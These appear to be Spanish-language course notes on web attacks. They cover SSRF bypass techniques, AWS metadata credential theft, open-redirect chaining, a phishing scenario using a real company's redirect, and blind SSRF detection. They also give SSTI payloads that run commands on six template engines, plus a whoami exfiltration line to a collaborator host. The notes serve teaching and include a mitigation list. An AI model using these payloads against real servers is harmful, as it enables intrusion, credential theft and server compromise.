## ① Repaso SSRF €” Los 3 Contextos Canónicos

### Resumen Integrado

| Contexto | Objetivo | Técnica Clave | Impacto |
|----------|----------|---------------|---------|
| **1. Localhost / Propio servidor** | Panel admin interno (`/admin`), endpoints privilegiados | `stockApi=http://localhost/admin` → encadenar delete | Escalada a admin, borrado usuarios, acceso funcionalidad oculta |
| **2. Infraestructura Interna** | Servicios en red privada (`192.168.0.0/24`, puertos 8000-9000) | Intruder: fuzzing IPs → fuzzing puertos → panel sin auth | Pivote a red interna, servicios sin autenticación expuestos |
| **3. Cloud Metadata (AWS)** | Credenciales IAM temporales en `169.254.169.254` | Navegación árbol: `/latest/meta-data/iam/security-credentials/<role>` | **Cloud Admin** €” acceso S3, RDS, Lambda, EC2 con permisos del rol |

> [!important] La metáfora unificada
> **SSRF usa el servidor web de mensajero.** El atacante no puede llegar a `localhost`, `192.168.x.x`, ni `169.254.169.254`. Pero el servidor **sí puede**. Si controlas la URL que el servidor visita, el servidor hace el trabajo sucio por ti.

## ② Bypasses de Filtros €” Taxonomía Completa

### A. Blacklist (Lista de Bloqueo) €” El Servidor Bloquea Patrones Conocidos

| Técnica | Payload | Por Qué Funciona |
|---------|---------|------------------|
| **IP Decimal** | `http://2130706433/` | `127.0.0.1` = 2130706433 en decimal. Parser IP lo acepta, regex bloquea solo string "127.0.0.1". |
| **IP Abreviada** | `http://127.1/` | `127.1` ≠¡ `127.0.0.1` (notación clase A). Muchos validadores no la contemplan. |
| **IP Octal** | `http://0177.0.0.1/` | Notación octal con leading zero. `0177` = 127 decimal. Backend parsea, frontend filtra string. |
| **IPv6 Loopback** | `http://[::1]/` | `::1` = localhost IPv6. Filtros solo miran IPv4. |
| **Dominio Propio (DNS Trick)** | `http://lvh.me/` → `127.0.0.1`<br>`http://mi-dominio.com/` → A record `127.0.0.1` | DNS resuelve a IP bloqueada. Servidor resuelve **en tiempo de request**, filtro valida **string estático**. |
| **Encoding 1x** | `http://127.0.0.1/%61dmin` | URL encoding simple. Validador decodifica 1 vez, ve "admin". Backend decodifica N veces. |
| **Encoding 2x (Doble)** | `http://127.0.0.1/%2561dmin` | `%25` = `%` codificado. Validador decodifica 1 vez → `%61dmin` (no bloquea). Backend decodifica 2 veces → `admin`. |
| **Encoding 3x (Triple)** | `http://127.0.0.1/%252561dmin` | Para backends que decodifican 3 veces (proxy → WAF → app). |

> [!important] Regla del Encoding
> **Validador decodifica 1 vez. Backend decodifica N veces.** Si N > 1, encoding (N-1)x bypassa el filtro. Siempre probar 1x, 2x, 3x.

### B. Open Redirect Chain €” Encadenamiento con Redirección Abierta

```
Parámetro vulnerable (SSRF) → URL de Open Redirect en misma app → Redirige a destino interno
```

| Paso | Request | Response |
|------|---------|----------|
| 1. Detectar Open Redirect | `GET /redirect?url=https://evil.com` | `302 Location: https://evil.com` |
| 2. Encadenar SSRF | `stockApi=/redirect?url=http://localhost/admin` | Servidor sigue redirect → llega a `/admin` interno |
| 3. Explotar | `stockApi=/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role` | Credenciales AWS |

> [!important] Condición necesaria
> El servidor **debe seguir redirecciones automáticamente** (default en la mayoría de librerías HTTP: `requests`, `axios`, `fetch`, `HttpClient`). Si `follow_redirects=False`, no funciona.

### C. Whitelist (Lista Permitida) €” El Servidor Solo Permite Dominios Conocidos

| Técnica | Payload | Explicación |
|---------|---------|-------------|
| **UserInfo + @** | `http://allowed.com@127.0.0.1/` | RFC 3986: `userinfo@host`. Parser extrae host como `127.0.0.1`. Validador ve `allowed.com` en host. |
| **Fragment + @ (Doble Encoding)** | `http://allowed.com#@127.0.0.1/`<br>Codificado: `http://allowed.com%23%40127.0.0.1/` | `#` inicia fragmento (ignorado por servidor). `@` en fragmento confundido por algunos parsers como userinfo. Doble encoding evita WAF. |
| **Subdominio Controlado** | `http://allowed.com.evil.com/` | Validador comprueba `endsWith(".allowed.com")` o regex suelta. Atacante registra `allowed.com.evil.com`. |
| **Path Traversal en Host** | `http://allowed.com/../../127.0.0.1/` | Parsers raros que normalizan path en host. Poco común pero posible. |

> [!warning] Whitelist = Más difícil, no imposible
> La clave es **entender QUÉ parte de la URL valida el whitelist** (host, domain, suffix, regex) y **QUÉ parte usa el backend para conectar** (host parsed). La discrepancia es la vulnerabilidad.

## ③ SSRF Ciego (Blind SSRF) + Burp Collaborator

### Qué es
> El servidor hace la petición **pero no refleja la respuesta** en el response HTTP al atacante. Timeout, 500, respuesta genérica, o respuesta vacía. La petición **sí se ejecuta en backend**.

### Detección: Burp Collaborator (o Interactsh / interact.sh)

```bash
# 1. Obtener URL Collaborator (Burp → Collaborator client → Copy to clipboard)
# Ejemplo: xyz123.collaborator.net

# 2. Inyectar en parámetro vulnerable
stockApi=http://xyz123.collaborator.net

# 3. Si hay SSRF ciego → Collaborator registra:
# - DNS lookup (A/AAAA)
# - HTTP request (GET/POST)
# - SMTP/other si aplica
```

### Interacción en Burp
```
Collaborator window:
[+] DNS: A query for xyz123.collaborator.net from 10.0.0.5 (target IP)
[+] HTTP: GET / from 10.0.0.5
 Headers: User-Agent: python-requests/2.31, Host: xyz123.collaborator.net
```

> [!tip] Collaborator vs Interactsh
> - **Burp Collaborator**: Integrado en Burp Pro, UI cómoda, polling automático.
> - **Interactsh (projectdiscovery)**: Open source, CLI, self-hosted, gratis. `interactsh-client -server interactsh.projectdiscovery.io`

### Explotación Ciega (Avanzada)
> Se verá en sesiones avanzadas. Requiere:
> 1. **Out-of-band data exfiltration**: `stockApi=http://$(whoami).xyz123.collaborator.net` (command injection en URL)
> 2. **Encadenamiento**: SSRF ciego → RCE en servicio interno → reverse shell
> 3. **Time-based**: `stockApi=http://localhost:8080/delay/10` → medir latencia respuesta

## ④ SSRF en Phishing €” Abuso de Open Redirect (Caso Repsol)

### Vector Real
> Email phishing con enlace legítimo de Repsol que redirige a página de credenciales clonada.

```
Email: "Factura Repsol - Revise su consumo"
Enlace: https://www.repsol.com/redirect?url=https://phishing-repsol.evil.com/login
```

### Por Qué Funciona
| Factor | Explicación |
|--------|-------------|
| **Dominio legítimo** | `repsol.com` pasa filtros antispam, reputación, DMARC/SPF/DKIM válidos |
| **Hover muestra dominio real** | Usuario pasa ratón → ve `repsol.com/redirect?url=...` → confía |
| **Redirección automática** | Navegador sigue 302 → aterriza en `phishing-repsol.evil.com` |
| **Página clonada** | CSS/JS/imágenes copiadas de Repsol real → indistinguible visualmente |
| **Credenciales robadas** | Usuario introduce user/pass → enviadas a servidor atacante → redirige a Repsol real |

### Mitigación (Lado Defensor)
```
1. Validar URL de redirect contra whitelist ESTRICTA (dominios exactos, no sufijos)
2. Página intermedia de confirmación: "Va a salir de repsol.com. ¿Continuar?"
3. Header Referrer-Policy: strict-origin-when-cross-origin
4. Educar usuarios: NUNCA introducir credenciales tras click en email
5. Monitorear Open Redirects en bug bounty / pentest interno
```

## ⑤ Introducción a SSTI (Server-Side Template Injection)

### Qué es
> Inyección en motor de plantillas (template engine) que el servidor usa para renderizar HTML/emails/PDFs. Si el input del usuario llega al template **sin sanitizar**, puede ejecutar código en el servidor.

### Motores Comunes + Detección + RCE

| Motor | Sintaxis Básica | Test Detección | Payload RCE |
|-------|-----------------|----------------|-------------|
| **Jinja2** (Python/Flask/Django) | `{{ 7*7 }}` → `49`<br>`{{ config }}` → objetos internos | `{{ 7*'7' }}` → `7777777` (string concat) | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` |
| **Twig** (PHP/Symfony) | `{{ 7*7 }}` → `49`<br>`{{ _self }}` → objeto template | `{{ 7*'7' }}` → `49` (numérico) | `{{ ['id']|filter('system') }}` o `{{ _self.env.registerUndefinedFilterCallback('system') }}` |
| **Freemarker** (Java) | `${7*7}` → `49`<br>`${.globals}` | `${7*'7'}` → error (tipado fuerte) | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **Velocity** (Java) | `#set($x=7*7)${x}` | `#set($x="7"*7)${x}` | `#set($rt=$class.forName("java.lang.Runtime"))#set($proc=$rt.getRuntime().exec("id"))` |
| **ERB** (Ruby/Rails) | `<%= 7*7 %>` → `49` | `<%= "7"*7 %>` → `7777777` | `<%= \`id\` %>` o `<%= system("id") %>` |
| **Smarty** (PHP) | `{$x=7*7}{$x}` | `{"7"|repeat:7}` | `{system("id")}` o `{php}system("id");{/php}` |

### Metodología Detección Universal

```
1. Identificar parámetro que se refleja en respuesta (buscar en Burp: query, body, headers)
2. Inyectar payload matemático simple: {{7*7}}, ${7*7}, <%=7*7%>, {7*7}
3. Si response contiene "49" → SSTI confirmado
4. Identificar motor: probar sintaxis específica (config, _self, .globals, .version)
5. Escalar a RCE: payload específico del motor + comando (id, whoami, cat /etc/passwd)
6. Post-explotación: reverse shell, enumeración, pivote
```

> [!warning] SSTI = RCE en la mayoría de casos
> A diferencia de XSS (lado cliente), SSTI ejecuta en **servidor**. Impacto: compromiso total del host, acceso a BD, secrets, red interna, pivote.

## ⑨ Frase Clave de la Sesión

> **"SSRF usa el servidor web de mensajero."**
> €” Carlos Castillo

> **Significado:** El atacante no tiene acceso directo a recursos internos. Pero **controla la URL que el servidor visita**. El servidor, con sus privilegios de red, hace la petición **por** el atacante y (en SSRF no ciego) le **devuelve la respuesta**. Es un proxy involuntario.
